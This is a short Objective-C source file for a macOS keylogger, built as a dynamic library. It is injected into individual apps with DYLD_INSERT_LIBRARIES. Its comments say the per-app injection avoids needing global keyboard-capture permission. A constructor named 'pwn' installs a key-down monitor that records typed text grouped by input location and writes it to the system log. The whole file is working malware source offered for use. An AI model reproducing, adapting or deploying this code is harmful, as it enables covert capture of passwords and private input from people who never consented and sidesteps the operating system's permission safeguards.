// Info:
// Universal macOS keylogger that tracks input locations. It's injected per app as it doesn't require having global keyboard capturing permission

// Usage:
// DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/app/Contents/MacOS/App

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>

@interface KeyloggerSingleton : NSObject
@property (atomic) NSPoint lastLocation;
@property (atomic, retain) NSMutableString *recordedString;
+ (id)sharedKeylogger;
@end

@implementation KeyloggerSingleton
@synthesize lastLocation;
@synthesize recordedString;
+ (id)sharedKeylogger {
    static KeyloggerSingleton *sharedInstance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        sharedInstance = [KeyloggerSingleton new];
    });
    return sharedInstance;
}

- (instancetype)init {
    if (self = [super init]) {
        self.lastLocation = NSPointFromString(@"0,0");
        self.recordedString = [NSMutableString string];
    }
    return self;
}

@end

__attribute__((constructor)) static void pwn(int argc, const char **argv) {
    NSLog(@"[*] Dylib injected");

    [NSEvent addLocalMonitorForEventsMatchingMask:NSEventMaskKeyDown handler:^NSEvent * _Nullable(NSEvent * _Nonnull event) {
        if (event.locationInWindow.x == [KeyloggerSingleton.sharedKeylogger lastLocation].x && event.locationInWindow.y == [KeyloggerSingleton.sharedKeylogger lastLocation].y) {
            [[KeyloggerSingleton.sharedKeylogger recordedString] appendString:event.characters];
        } else {
            [[KeyloggerSingleton.sharedKeylogger recordedString] setString:event.characters];
            [KeyloggerSingleton.sharedKeylogger setLastLocation:event.locationInWindow];
        }
        
        NSLog(@"[*] Recorded string: %@", [KeyloggerSingleton.sharedKeylogger recordedString]);
        return event;
    }];
}
